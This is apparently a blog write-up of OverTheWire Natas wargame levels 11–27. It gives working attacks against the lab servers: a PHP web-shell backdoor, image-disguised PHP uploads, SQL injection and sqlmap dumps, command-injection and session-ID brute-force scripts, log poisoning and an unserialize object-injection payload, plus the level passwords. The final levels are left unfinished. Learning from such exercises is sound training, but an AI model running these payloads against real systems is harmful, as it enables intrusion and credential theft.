---
title: "Linux training with overthewire [Part 5/10: Natas 11-20]"
date: 2018-11-30T14:00:00
categories: [opensource,linux,bash,shell,hack,server]
---
Excerpt here...
<!--more-->

This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-1 %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-2 %})
- [Linux training with overthewire Part 3: Bandit 21-30]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-3 %})
- [Linux training with overthewire Part 4: Natas 1-10]({% post_url 2018/2018-11-30-linux-training-overthewire-natas-1 %})
- Linux training with overthewire Part 5: Natas 11-20
- [Linux training with overthewire Part 6: Leviathan]({% post_url 2018/2018-11-30-linux-training-overthewire-leviathan %})
- [Linux training with overthewire Part 7: Krypton]({% post_url 2018/2018-11-30-linux-training-overthewire-krypton %})

### Level 11 - XOR encryption
```
http://natas11.natas.labs.overthewire.org/ natas11 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
Check your Cookies and find `Set-Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=`.

This is an base64-encoded JSON object from the PHP array
```php
[
  "showpassword"=>"no",
  "bgcolor"=>"#ffffff"
]
```

As we have the base value and the final value, the XOR can be reversed to find the key. Copy/paste the `xor_encrypt` function and replace `$key` by the base64-decoded value of the cookie:
```bash
$ vim natas11.php
```
```php
function xor_encrypt($in) {
  $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
  $text = $in;
  $outText = '';
  // Iterate through each character
  for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
  }
  return $outText;
}
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
echo xor_encrypt(json_encode($defaultdata));
```
```bash
$ php -f natas11.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

Here's the key: `qw8J`! We can now replace it in the default algorithm, and change `"showpassword"=>"yes"`:
```php
function xor_encrypt($in) {
  $key = 'qw8J';
  $text = $in;
  $outText = '';
  // Iterate through each character
  for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
  }
  return $outText;
}
$defaultdata = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
echo xor_encrypt(json_encode($defaultdata));
```
```bash
$ php -f xor.php
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```
Update your `data` cookie value and refresh the page to get the password:
`EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

### Level 12 - File upload without security
```
http://natas12.natas.labs.overthewire.org/ natas12 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```
Alright, what do we have?
- a POST form from index.php to index.php
- 2 hidden text fields:
  - `MAX_FILE_SIZE` defaulted to `1000`
  - `filename` with a generated 10-char string from `genRandomString()` then `.jpg`
- A `file` field named `uploadedfile`

After looking at the source code, there is no security on the file type, as it is guessed from the client-side field `filename` with `pathinfo`:
```php
$ext = pathinfo($_POST["filename"], PATHINFO_EXTENSION);
```

So basically we can upload any file (such as a PHP file) and display/run it on the server. Let's check if we are right. Create a simple file `love.php`:
```
<?php echo "love"; ?>
```
Display the form, replace the extension of `filename` to `.php` and upload our PHP file:


<div class="text-center">
  <video autoplay loop muted playsinline height="250">
    <source src="/assets/images/2018/12/overthewire-natas12-php-injection.mp4" type="video/mp4" />
  </video>
</div>

💦💦💦💦💦

Let's hack! Inject a classic shell backdoor:
```html
<pre><?php system($_GET['backdoor']); ?></pre>
```
[http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=cat%20/etc/natas_webpass/natas13](http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=cat%20/etc/natas_webpass/natas13) gives `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.


We can also display other people's solutions: [http://natas12.natas.labs.overthewire.org/upload/000_myrosblog_com_backdoor.php?backdoor=ls -alh](http://natas12.natas.labs.overthewire.org/upload/000_myrosblog_com_backdoor.php?backdoor=ls -alh)

![](/assets/images/2018/12/overthewire-natas12-php-injection-list-solutions.jpg)

Or eval PHP code with `<pre><?php eval($_GET['backdoor_eval']); ?></pre>`
[http://natas12.natas.labs.overthewire.org/upload/ctu6g7y59k.php?backdoor_eval=phpinfo();](http://natas12.natas.labs.overthewire.org/upload/ctu6g7y59k.php?backdoor_eval=phpinfo();)

### Level 13 - File upload with `exif_imagetype()` security
```
http://natas13.natas.labs.overthewire.org/ natas13 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

The security has been ~~slightly~~ enhanced:
- Check on `$_FILES[...]["error"]` (l. 46)
- The `MAX_FILE_SIZE` field is no longer used. The maximum file size is hardcoded as `1000` on server-side (l. 52)
- Check the file type with `exif_imagetype()` (l. 54) <-- this is the interesting part

Create a JPG image with just a pixel:
- Size 1x1
- 1 DPI
- JPG Quality 1

> You can download one here [overthewire-natas13-pixel.jpg](/assets/images/2018/12/overthewire-natas13-pixel.jpg)

Open it in any decent image editor, and add the payload as "comment". Example with GIMP `Image > Image properties`:
![](/assets/images/2018/12/overthewire-natas13-pixel-edited-with-gimp.jpg)

Gives the following [http://natas13.natas.labs.overthewire.org/upload/pdy3zp0pdc.php](http://natas13.natas.labs.overthewire.org/upload/pdy3zp0pdc.php)
![](/assets/images/2018/12/overthewire-natas13-pixel-edited-with-love.jpg)
> You can download it here [overthewire-natas13-pixel-with-love.jpg](/assets/images/2018/12/overthewire-natas13-pixel-with-love.jpg)


💦💦💦💦💦

> Open the file in any hex editor, comments are added after the `FF FE` bytes:
![](/assets/images/2018/12/overthewire-natas13-pixel-edited-with-love-in-hex-editor.jpg)
See [https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure](https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure)

Inject the same backdoor as in the previous challenge [http://natas13.natas.labs.overthewire.org/upload/rh8gw09927.php?backdoor=cat%20/etc/natas_webpass/natas14](http://natas13.natas.labs.overthewire.org/upload/rh8gw09927.php?backdoor=cat%20/etc/natas_webpass/natas14)

`Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

![](/assets/images/2018/12/overthewire-natas13-solution.jpg)

> You can download the final payload here [overthewire-natas13-pixel-with-backdoor.jpg](/assets/images/2018/12/overthewire-natas13-pixel-with-backdoor.jpg)

> Also, we can completely forge the payload without any software. The idea is to add the JPG magic numbers `ff d8 ff` in hexadecimal format
```bash
$ echo -n -e "\xff\xd8\xff<?php system(\$_GET['backdoor']); ?>" > payload.jpg
$ file payload.jpg
payload.jpg: JPEG image data
```
It takes 38 octets and works just as fine!!
It also proves that `file` and `exif_imagetype` are based on magic numbers, which may be completely misleading!!

### Level 14 - SQL injection
```
http://natas1.natas.labs.overthewire.org/ natas Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```
In the PHP code we have
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=...";
```

If we inject `" or 1=1 #` in the username field, we send this final SQL code:

```sql
SELECT * from users where username="" or 1=1 # and password=...
-- Equivalent to
SELECT * from users
```

`Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

### Level 15 - SQL enumeration with `sqlmap`
```
http://natas15.natas.labs.overthewire.org/ natas15 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

```bash
$ ./sqlmap.py --auth-cred="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" --auth-type=BASIC -u 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16' --level 3 --dbms=mysql -p username --dbs
available databases [2]:
[*] information_schema
[*] natas15
$ ./sqlmap.py --auth-cred="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" --auth-type=BASIC -u 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16' --level 3 --dbms=mysql -p username -D natas15 -T users --dump
Database: natas15
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| alice    | hROtsfM734                       |
| natas16  | WaIHEacj63wnNIBROHeqi3p9t0m5nhmh |
+----------+----------------------------------+
```
`WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`
References:
- DVWA blind SQLi https://github.com/ethicalhack3r/DVWA
- https://www.youtube.com/watch?v=7PrUX2587A0
- https://www.owasp.org/index.php/Blind_SQL_Injection
- http://sqlmap.org/
- https://github.com/sqlmapproject/sqlmap/wiki/Usage

### Level 16 - Shell injection without ;|&\`\\'"
```
http://natas16.natas.labs.overthewire.org/ natas16 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

We still have `$()`! The payload `$(grep -e ^a /etc/natas_webpass/natas17)love` will display `beloved,love..` if the password doesn't start with an `a`.

Bad boy:
```bash
$(grep -e ^a /etc/natas_webpass/natas17)love
# will result in "grep -i love dictionnary" so the output is
# beloved, love
```

Good boy:
```bash
$(grep -e ^8 /etc/natas_webpass/natas17)love
# will result in "grep -i 8love dictionnary" so the output is
# -- nothing --
```

Let's bruteforce this 💪💪💪 with python 3 🐍3️⃣

```python
#! /usr/bin/env python3
import requests

pwd = ''
baseUrl = 'http://natas16.natas.labs.overthewire.org/?needle=$(grep -e ^% /etc/natas_webpass/natas17)love'
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for i in range(0, 50):
    print('Current pwd "'+pwd+'" Bruteforcing', end='')
    for l in alphabet:
        print('.', end='', flush=True)
        url = baseUrl.replace('%', pwd+l)
        r = requests.get(url, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if 'love' not in r.text:
            pwd += l
            print('letter found:', l)
            break;
```

```
Current pwd "" Bruteforcing.............................................................letter found: 8
Current pwd "8" Bruteforcing..........................................letter found: P
Current pwd "8P". Bruteforcing...................letter found: s
Current pwd "8Ps" Bruteforcing........................................................letter found: 3
Current pwd "8Ps3" Bruteforcing..................................letter found: H
Current pwd "8Ps3H" Bruteforcing.....................................................letter found: 0
[...]
Current pwd "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
```
`8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

### Level 17 - SQL enumeration 2
```
http://natas17.natas.labs.overthewire.org/ natas17 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

```bash
$ ./sqlmap.py --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u 'http://natas17.natas.labs.overthewire.org/index.php?username=' --level 3 --dbms='MySQL 5.5' -p username --technique T --dbs
available databases [2]:
[*] information_schema
[*] natas17
$ ./sqlmap.py --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u "http://natas17.natas.labs.overthewire.org/index.php?username=natas17" --level 3 --dbms="MySQL 5.5" -p username --technique T -D natas17 -T users -C username,password --dump
Database: natas17
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| user1    | 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd |
| user2    | MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 |
| user3    | VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD |
| natas18  | xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP |
+----------+----------------------------------+
```
The password for level 18 is `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`.

### Level 18 - `PHPSESSID` spoofing
```
http://natas1.natas.labs.overthewire.org/ natas xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

Each in PHP is given an id and then stored in a file on the server, typically for PHP 5 `/var/lib/php5/sessions/sess_{session_id}`. On the client side, the id is stored in a cookie named `PHPSESSID`. Ids commonly are a set of alphanumeric char. But here it seems they only go from 0 to 640. So we can use some bruteforce.

```python
#! /usr/bin/env python3
import requests

baseUrl = 'http://natas18.natas.labs.overthewire.org/index.php'
for i in range(0, 640):
    print('Current i='+str(i))
    r = requests.get(baseUrl, auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies={'PHPSESSID':str(i)})
    if 'You are an admin' in r.text:
        print('admin found for i='+str(i))
        break;
```
Terminal output:
```
Current i=117
Current i=118
Current i=119
admin found for i=119
```
Change your cookie PHPSESSID to 119 and get the password:
```
You are an admin. The credentials for the next level are:
Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

The password for the level 19 is `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`.

Reference:
- http://ha.xxor.se/2011/09/local-session-poisoning-in-php-part-1.html (not directly related but good to know)

### Level 19 -
```
http://natas19.natas.labs.overthewire.org/ natas19 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

Send `aaa` in the username field and check your cookie value. Sounds like a base64 encoded string. Try it in a script with `for i in range(0,5)` and add an `a` each time. *See [natas19-discovery.py](/assets/overthewire/natas19-discovery.py)* for source code

```bash
$ ./natas19.py
a               3234312d61          # 241-a
aa              3433302d6161        # 430-aa
aaa             38372d616161        # 87-aaa
aaaa            3539342d61616161    # 594-aaaa
aaaaa           3339352d6161616161  # 395-aaaaa
$ ./natas19.py
a               3336382d61          # 368-a
aa              3630362d6161        # 606-aa
aaa             3330362d616161      # 306-aaa
aaaa            3234302d61616161    # 240-aaaa
aaaaa           34352d6161616161    # 45-aaaaa
```

So we have `{random_int}-{username}`. Chances are pretty high that the username is set to admin. So we have to execute the same bruteforce: `{bruteforce_here}-admin`.

```python
#! /usr/bin/env python3
import requests
import binascii

baseUrl = 'http://natas19.natas.labs.overthewire.org/index.php'
for i in range(0, 640):
    PHPSESSID = str(i)+'-admin'
    print('Sending '+PHPSESSID+' => ', end='')
    PHPSESSID = binascii.hexlify(str.encode(PHPSESSID)).decode()
    print(PHPSESSID)
    r = requests.get(baseUrl, auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies={'PHPSESSID':PHPSESSID})
    if 'You are logged in as a regular user' not in r.text:
        break
```

Output:
```
Sending 278-admin => 3237382d61646d696e
Sending 279-admin => 3237392d61646d696e
Sending 280-admin => 3238302d61646d696e
Sending 281-admin => 3238312d61646d696e
```

> See [natas19-bruteforce.py](/assets/overthewire/natas19-bruteforce.py) for source code

Change you cookie value to `3238312d61646d696e` and you're all set!
```
You are an admin. The credentials for the next level are:
Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

The password for the level 20 is `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`.

### Level 20 - Custom Session handling
```
http://natas20.natas.labs.overthewire.org/ natas20 eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```
Highlights on `myread()` (called by `session_set_save_handler()` and `print_credentials()`:
```php
function myread($sid) {
  $_SESSION = array(); // reset session
  $data = file_get_contents($filename); // read from /session/my_sess_4678437324
  // each line is exploded by a space, left side is the key, right side is the value:
  // key1 value1
  // key2 value2
}
function print_credentials() {
  if($_SESSION["admin"] == 1)
    // good boy
}
```

OK let's try a simple test to init our session:

[http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=love](http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=love)

![](/assets/images/2018/12/overthewire-natas20-step-1.png)

And now let's add a newline (URL encoded value `%0A`) and `admin 1`:

[http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=love%0Aadmin%201](http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=love%0Aadmin%201)

(You need to load the page twice as we read, then we write) And you should get the following:

![](/assets/images/2018/12/overthewire-natas20-step-2.png)

```bash
You are an admin. The credentials for the next level are:
Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

References:
- https://www.notsosecure.com/remote-code-execution-via-php-unserialize/ (not related but might be handy in the future)

### Level 21 - Session spoofing with sub-domains
```
http://natas21.natas.labs.overthewire.org/ natas21 IFekPyrQXftziDEsUr3x21sYuahypdgJ
```
Alright we got 2 websites:
- The target: http://natas21.natas.labs.overthewire.org/
- The vulnerable sub-domain http://natas21-experimenter.natas.labs.overthewire.org

The sub-domain exposes a security breaches through this code (l. 14-18):
```php
if(array_key_exists("submit", $_REQUEST)) {
  foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
  }
}
```
Any key/value pair sent through GET/POST will be set in the `$_SESSION`, example with [http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=Update&admin=1&debug=1](http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=Update&admin=1&debug=1):
![](/assets/images/2018/12/overthewire-natas21-requests-exploit.jpg)

As we previously saw, PHP sessions are written to and read from a file (default `php5/sessions/sess_{PHPSESSID}`) on the server side, and the id is stored as a cookie on the client side. We can copy the PHHSESSID of `natas21-experimenter.` and use it on `natas21.`:

<div class="text-center">
  <video autoplay loop muted playsinline height="250">
    <source src="/assets/images/2018/12/overthewire-natas21-session-spoofing.mp4" type="video/mp4" />
  </video>
</div>

```
You are an admin. The credentials for the next level are:
Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

### Level 22 - PHP `header()` exploit
```
http://natas22.natas.labs.overthewire.org/ natas22 chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

Vulnerable source:
```php
if(array_key_exists("revelio", $_GET)) {
  if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
  }
}
```

`header()` will just add a HTTP header `Location: /` but won't redirect. Only browsers will perfom the redirect. So let's use something other than a browser. `curl` maybe?

```bash
$ curl --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ "http://natas22.natas.labs.overthewire.org?revelio=1"
You are an admin. The credentials for the next level are:<br>
<pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
```

Reference:
- [http://php.net/manual/en/function.header.php](http://php.net/manual/en/function.header.php)

### Level 23 - String comparison
```
http://natas23.natas.labs.overthewire.org/ natas23 D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

PHP can be used to compare a string to a number, this is the vulnerability for this exercice:
```php
if(
    strstr($_REQUEST["passwd"],"iloveyou") &&
    $_REQUEST["passwd"] > 10
  ){
    // good boy
}
```

Which translated in plain English gives "if the password contains 'iloveyou' and the integer conversion of the password is greater than 10"

The integer conversion uses `intval` (except if there's a `.`, hence it uses `floatval`). `intval` will parse the beginning of the string:
```bash
$ php -r "var_dump(intval('5text here'));"
int(5)
$ php -r "var_dump(intval('5text here') > 4);" # equivalent to "('5text here') > 4"
bool(true)
```
> Internally, `intval` uses the Unix C function `strtod(3)`.

So use any number greater than 10, followed by "iloveyou", e.g. `http://natas23.natas.labs.overthewire.org/?passwd=69iloveyousomuch`:
```
Username: natas24
Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

Reference:
- http://php.net/manual/en/language.types.string.php#language.types.string.conversion
- https://linux.die.net/man/3/strtod

### Level 24 - `strcmp` return value
```
http://natas.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
```
The only check relies on the `strcmp` function:
```php
if(!strcmp($_REQUEST["passwd"],"<censored>")){
  // good boy
}
```

Check the return values on [php.net/strcmp](http://php.net/manual/en/function.strcmp.php). The first comment points out that if parameters are not string, it will return `NULL`. `NULL` will allow us to get into that condition because instead of using `strcmp() === 0` (as they do in [the first example on php.net](http://php.net/manual/en/function.strcmp.php#example-6112)), natas24 uses `!`. In fact, any error will return `NULL`.

Let's trigger an error with `passwd[]=hello`: http://natas24.natas.labs.overthewire.org/?passwd[]=hello
```
Username: natas25
Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

Reference:
- http://php.net/manual/en/function.strcmp.php#108563

### Level 25 - PHP `include` vulnerability
```
http://natas.natas.labs.overthewire.org/ natas GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

This level is interesting as it is based on 2 flaws:
- write arbitrary information to /var/www/natas/natas25/logs/natas25_\*.log, such as natas26's password, via the `include` function. *See the [include vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#PHP) on Wikipedia*
- read any natas25-readable file, such as the log file we just wrote into.

#### 1. Write arbitrary data
Vulnerable code at l.57-59:
```php
$log = $log . " " . $_SERVER['HTTP_USER_AGENT']; // we can control this value
$fd = fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a"); // we also know and may control this value
fwrite($fd,$log);
```
Let's write the content of `/natas/natas_webpass/natas26` to our log file:

```bash
$ curl -v --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org?lang=natas_webpass -H "User-Agent:<?php echo file_get_contents('/etc/natas_webpass/natas26') ?>"
< Set-Cookie: PHPSESSID=t392uh11jernde0e8d5jco84m2;
</form>
</div>
* Connection #0 to host natas25.natas.labs.overthewire.org left intact
```
As we can see, the HTML ends up with `</div>` instead of `</html>` so we hit `exit()`, which means we successfully entered in `logRequest()`. Also, take note of the `PHPSESSID`.

### 2. Read a file
```bash
$ curl -v --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_t392uh11jernde0e8d5jco84m2.log
</div>

[17.12.2018 16::49:12] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 "Illegal file access detected! Aborting!"
<br />
```


### Level 26 - PHP exploit with `unserialize()` and `__destruct()`
```
http://natas26.natas.labs.overthewire.org/ natas26 oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```

During the unserialization of a PHP object, the magic methods `__wakeup()` and `__destruct()` will be called.

Function call order:
```php
session_start();
if cookie drawing OR get x1 x2 y1 y2
  $imgfile="img/natas26_" . session_id() .".png";
  drawImage($imgfile);
    imagecreatetruecolor()
    drawFromUserdata()
      if get x1..
        imagecolorallocate()
        imageline()
      if cookie drawing
        $drawing=unserialize(base64_decode($_COOKIE["drawing"])); // <-- injection l.70
        imagecolorallocate()
        imageline()
    imagepng
    imagedestroy
  showImage($imgfile);
    if file_exists($imgfile)
      echo <img src="$imgfile"/>
  storeData();
    setcookie()
```

So in order to get to this code, we juste have to create a cookie with the key `drawing` and a value. Let's try to crash test the app to see if it reacts as exepcted.
```bash
# set drawing to "love" and refresh the page
Notice: unserialize(): Error at offset 0 of 3 bytes in /var/www/natas/natas26/index.php on line 70
```
Boom, line 70, that's our vulnerable point.

So we need to create a serialized version of a `Logger` object, with custom `logFile` and `exitMsg` as they will be called in `__destruct()`;

Let's forge our payload in `payload.php`:
```php
<?php
class Logger{
  private $logFile = "img/hello.php";
  private $initMsg = "";
  private $exitMsg = "<?= file_get_contents('/etc/natas_webpass/natas27') ?>";
}
$x = new Logger();
echo base64_encode(serialize($x));
```
```php
$ php payload.php > payload
$ curl --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/ -b "drawing=$(cat payload)"
$ curl --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/img/hello.php
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```

Reference:
- http://php.net/manual/en/function.unserialize.php
- https://www.owasp.org/index.php/PHP_Object_Injection
- https://www.notsosecure.com/remote-code-execution-via-php-unserialize/

### Level 27 - SQL trunc varchar
```
http://natas27.natas.labs.overthewire.org/ natas27 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```
The first obvious thing we all tried was to exploit `mysql_real_escape_string()` ([mysql_real_escape_string ref on php.net](http://php.net/manual/en/function.mysql-real-escape-string.php)). Buuuuuut it can only work with some conditions:
- non-quoted values, such as `"SELECT * from users where user=$user"`. If `$user="%"`, you pwned it. Links:
  - [Explications on StackOverflow](https://stackoverflow.com/a/5741264)
  - http://blackburnmoonlit.blogspot.com/2012/01/bypassing-mysqlescapestring-while-sql.html
- Have a multi-byte charset such as GBK. The hex value `0x27` is the literal quote `'`. The quote is going to be prefixed by hex `0x5c` (literal `\`). We juste have to find a multi-byte character ending with `0x5c`: `0x??27` will be replaced by `0x??5c27`. The GBK character `0x??5c` will be interpreted as 1 char, and won't escape `0x27`.
  - https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string

But we have none of the aboe conditions. Time to get creative 💡

varchar 64, `natas28                                                               hello`

### Level  -
```
http://natas.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
```



This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-1 %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-2 %})
- [Linux training with overthewire Part 3: Bandit 21-30]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-3 %})
- [Linux training with overthewire Part 4: Natas]({% post_url 2018/2018-11-30-linux-training-overthewire-natas-1 %})
- Linux training with overthewire Part 5: Natas 11-
- [Linux training with overthewire Part 5: Leviathan]({% post_url 2018/2018-11-30-linux-training-overthewire-leviathan %})
